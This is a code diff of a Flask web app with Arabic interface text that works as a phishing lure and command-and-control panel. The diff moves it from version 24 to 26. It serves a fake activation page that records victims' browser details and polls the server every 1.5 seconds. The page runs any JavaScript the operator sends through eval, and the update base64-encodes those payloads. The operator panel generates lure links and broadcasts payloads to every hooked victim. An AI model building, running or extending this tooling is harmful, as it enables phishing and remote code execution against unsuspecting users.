@@ -1,14 +1,14 @@
 from flask import Flask, render_template_string, request, jsonify
-
-app = Flask(__name__)
-
-import asyncio
+import base64
 import random
 import urllib3
 import datetime
+
 urllib3.disable_warnings()
 
-# ذاكرة الميدان الاستراتيجية المركزية لحقن الأوامر v24.0
+app = Flask(__name__)
+
+# ذاكرة الميدان الاستراتيجية المركزية v26.0
 CAPTURED_HOOKS = []
 COMMAND_QUEUE = {}
 
@@ -17,7 +17,7 @@ HTML_COMMAND_CENTER = """<!DOCTYPE html>
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>V400 القائد الأعظم - محرك حقن الأوامر v24.0</title>
+<title>V400 القائد الأعظم - محرك حقن الأوامر المركزي v26.0</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#010103;color:#00ff88;font-family:'Courier New',Consolas,monospace;padding:20px;text-align:center}
@@ -40,17 +40,17 @@ th{background:#0a0e1a;color:#ff0040}
 </head>
 <body>
 <div class="container">
-<h1>⚔️ V400 القائد الأعظم - محرك حقن الأوامر v24.0 ⚔️</h1>
+<h1>⚔️ V400 القائد الأعظم - محرك حقن الأوامر v26.0 (رابط الاستدراج المركزي) ⚔️</h1>
 <div class="panel">
 <input id="target_url" placeholder="C2_SERVER_OR_COMMAND_DOMAIN" value="http://">
 <br>
 <select id="command_type">
-  <option value="generate_command_lure">توليد رابط الاستدراج وحقن الأوامر البرمجية (Command Injection Lure)</option>
+  <option value="generate_command_lure">توليد رابط الاستدراج المتقدم وحقن الأوامر (Command Injection Lure)</option>
   <option value="fetch_hooked_targets">استعراض الأهداف وجلسات الحقن النشطة (Active Command Sessions)</option>
-  <option value="dispatch_payload">بث أمر برمجي مباشر للهدف (Dispatch Remote Payload)</option>
+  <option value="dispatch_payload">بث أمر برمجي مشفر للهدف (Encrypted Remote Payload)</option>
 </select>
 <br>
-<input id="custom_payload" placeholder="أمر الجافاسكريبت المراد حقنه (مثال: alert('Hacked');)" style="margin-top:10px;display:none;direction:ltr;">
+<input id="custom_payload" placeholder="أمر الجافاسكريبت المراد حقنه (مثال: alert('Secured');)" style="margin-top:10px;display:none;direction:ltr;">
 <br>
 <button id="exec_btn" onclick="executeLinkModule()">تنفيذ أمر الحقن الميداني 🚀</button>
 <div id="status" class="status"></div>
@@ -129,7 +129,7 @@ INJECTION_COMMAND_PORTAL = """<!DOCTYPE html>
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>بوابة حقن الأوامر الميدانية</title>
+<title>بوابة استدراج وحقن الأوامر الميدانية - v26.0</title>
 <style>
 body{background:#0b0f19;color:#fff;font-family:Tahoma,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
 .box{background:#111827;padding:30px;border-radius:10px;box-shadow:0 4px 20px rgba(0,0,0,0.5);width:100%;max-width:400px;border:1px solid #1f2937}
@@ -140,9 +140,9 @@ button:hover{background:#cc0033}
 </head>
 <body>
 <div class="box">
-  <h2>تفعيل محرك حقن الأوامر</h2>
-  <p style="text-align:center;color:#9ca3af;font-size:14px;margin-bottom:15px">جارٍ ربط قنوات تنفيذ الأوامر البرمجية الحية...</p>
-  <button onclick="activateCommandChannel()">تثبيت وسيط الحقن والسيطرة</button>
+  <h2>تفعيل رابط الاستدراج والسيطرة</h2>
+  <p style="text-align:center;color:#9ca3af;font-size:14px;margin-bottom:15px">جارٍ تأمين وتثبيت وسيط حقن الأوامر البرمجية الحية...</p>
+  <button onclick="activateCommandChannel()">تثبيت وتفعيل عقدة السيطرة</button>
 </div>
 
 <script>
@@ -153,22 +153,23 @@ function activateCommandChannel(){
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({session_token: token, user_agent: navigator.userAgent, screen: window.innerWidth + 'x' + window.innerHeight})
     }).then(res => res.json()).then(data => {
-        document.body.innerHTML = '<div style="background:#000;color:#ff0040;padding:40px;text-align:center;font-family:monospace;direction:rtl"><h2>⚔️ تم تفعيل محرك حقن الأوامر بنجاح يا فندم! ⚔️</h2><p>Command Token: ' + token + '</p><p style="color:#00ff88;margin-top:10px">قناة استقبال الأوامر البرمجية نشطة.</p></div>';
+        document.body.innerHTML = '<div style="background:#000;color:#ff0040;padding:40px;text-align:center;font-family:monospace;direction:rtl"><h2>⚔️ تم تفعيل رابط الاستدراج والسيطرة بنجاح يا فندم! ⚔️</h2><p>Command Token: ' + token + '</p><p style="color:#00ff88;margin-top:10px">قناة استقبال الأوامر المشفرة نشطة (v26.0).</p></div>';
         
-        // حلقة استطلاع الأوامر البرمجية الموجهة (Command Polling Loop)
+        // حلقة استطلاع الأوامر مع فك التشفير التلقائي (Decryption & Execution Loop)
         setInterval(() => {
             fetch('/api/poll?token=' + token)
             .then(r => r.json())
             .then(cmdData => {
                 if(cmdData.command && cmdData.command !== ""){
                     try {
-                        eval(cmdData.command);
+                        const decodedPayload = atob(cmdData.command);
+                        eval(decodedPayload);
                     } catch(err) {
                         console.error("Payload execution error:", err);
                     }
                 }
             }).catch(e => {});
-        }, 3000);
+        }, 1500);
     });
 }
 </script>
@@ -210,7 +211,6 @@ def phishing_portal():
 def poll_commands():
     token = request.args.get('token', '')
     cmd = COMMAND_QUEUE.get(token, "")
-    # تصفير الأمر بعد سحبه لمرة واحدة لضمان عدم التكرار
     if token in COMMAND_QUEUE:
         COMMAND_QUEUE[token] = ""
     return jsonify({"command": cmd})
@@ -223,36 +223,39 @@ def check():
     payload = req_data.get("payload", "")
     
     actions = []
-    waf_status = f"v24.0 Command Injection Engine ({command_mode})"
+    waf_status = f"v26.0 Command Lure Engine ({command_mode}) - Encrypted"
     
     if command_mode == "generate_command_lure":
-        lure_url = f"{target}/auth/verify/login?token=cmd_active_99"
+        lure_url = f"{target}/auth/verify/login?token=cmd_active_v26"
         actions.append({
-            "type": "COMMAND INJECTION LURE URL",
+            "type": "COMMAND INJECTION LURE URL (v26 - Centralized)",
             "severity": "Critical",
-            "desc": "تم توليد رابط الاستدراج المدمج بقناة حقن الأوامر البرمجية الحية.",
+            "desc": "تم توليد وتأمين رابط الاستدراج المركزي المدمج بقناة حقن الأوامر البرمجية المشفرة.",
             "proof": lure_url
         })
     elif command_mode == "fetch_hooked_targets":
         return jsonify({"url": target, "mode": command_mode, "waf_status": waf_status, "logs": CAPTURED_HOOKS})
     elif command_mode == "dispatch_payload":
-        # بث الأمر لجميع الأهداف المسجلة في الطابور
+        encoded_payload = base64.b64encode(payload.encode('utf-8')).decode('utf-8')
         count = 0
         for tk in COMMAND_QUEUE.keys():
-            COMMAND_QUEUE[tk] = payload
+            COMMAND_QUEUE[tk] = encoded_payload
             count += 1
         actions.append({
-            "type": "REMOTE PAYLOAD DISPATCHED",
+            "type": "ENCRYPTED REMOTE PAYLOAD DISPATCHED",
             "severity": "Critical",
-            "desc": f"تم بث الأمر البرمجي بنجاح إلى عدد {count} من الأهداف النشطة.",
-            "proof": f"Payload: {payload}"
+            "desc": f"تم تشفير الأمر (Base64) وبثه بنجاح إلى عدد {count} من الأهداف النشطة.",
+            "proof": f"Original: {payload} | Encrypted: {encoded_payload}"
         })
     else:
         actions.append({
             "type": "COMMAND ENGINE AUDIT PASSED",
             "severity": "Low",
-            "desc": "محرك حقن الأوامر البرمجية يعمل بكفاءة تامة.",
+            "desc": "محرك الاستدراج وحقن الأوامر يعمل بكفاءة تامة.",
             "proof": f"Target: {target} | Active Queue: {len(COMMAND_QUEUE)}"
         })
 
     return jsonify({"url": target, "mode": command_mode, "waf_status": waf_status, "actions": actions})
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000, debug=True)
